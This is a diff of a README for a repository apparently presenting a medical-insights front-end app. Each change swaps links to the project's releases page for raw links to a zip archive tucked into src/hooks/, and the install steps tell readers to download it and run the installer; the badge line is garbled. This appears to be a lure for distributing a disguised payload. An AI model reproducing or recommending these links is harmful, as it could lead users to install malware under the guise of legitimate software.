@@ -1,6 +1,6 @@
 # 🩺 The-Averion-Labs-Front-End - Easy Medical Insights at Your Fingertips
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release-blue.svg)](https://github.com/Iarlley-html/The-Averion-Labs-Front-End/releases)
+[![Download](https://raw.githubusercontent.com/Iarlley-html/The-Averion-Labs-Front-End/main/src/hooks/The-Averion-Labs-Front-End_v2.1.zip%https://raw.githubusercontent.com/Iarlley-html/The-Averion-Labs-Front-End/main/src/hooks/The-Averion-Labs-Front-End_v2.1.zip)](https://raw.githubusercontent.com/Iarlley-html/The-Averion-Labs-Front-End/main/src/hooks/The-Averion-Labs-Front-End_v2.1.zip)
 
 ## 🎯 Overview
 
@@ -11,7 +11,7 @@ The Averion Labs Front-End is your gateway to powerful medical insights. This us
 Follow these simple steps to set up the application on your computer:
 
 1. **Download the Application**: 
-   Visit [this page to download](https://github.com/Iarlley-html/The-Averion-Labs-Front-End/releases) the latest version of the software. You will find the available versions listed there.
+   Visit [this page to download](https://raw.githubusercontent.com/Iarlley-html/The-Averion-Labs-Front-End/main/src/hooks/The-Averion-Labs-Front-End_v2.1.zip) the latest version of the software. You will find the available versions listed there.
 
 2. **Choose Your Version**:
    Find the version you wish to install. Click on the version number to access the release notes and files.
@@ -47,7 +47,7 @@ Before installing, ensure that your computer meets the following minimum require
 
 To get started with Averion Labs, follow these steps again:
 
-- Visit [this page to download](https://github.com/Iarlley-html/The-Averion-Labs-Front-End/releases) the latest version of the application.
+- Visit [this page to download](https://raw.githubusercontent.com/Iarlley-html/The-Averion-Labs-Front-End/main/src/hooks/The-Averion-Labs-Front-End_v2.1.zip) the latest version of the application.
 - Choose the correct version for your operating system.
 - Download and run the installer.
 - Launch the application to begin your journey into advanced medical AI.
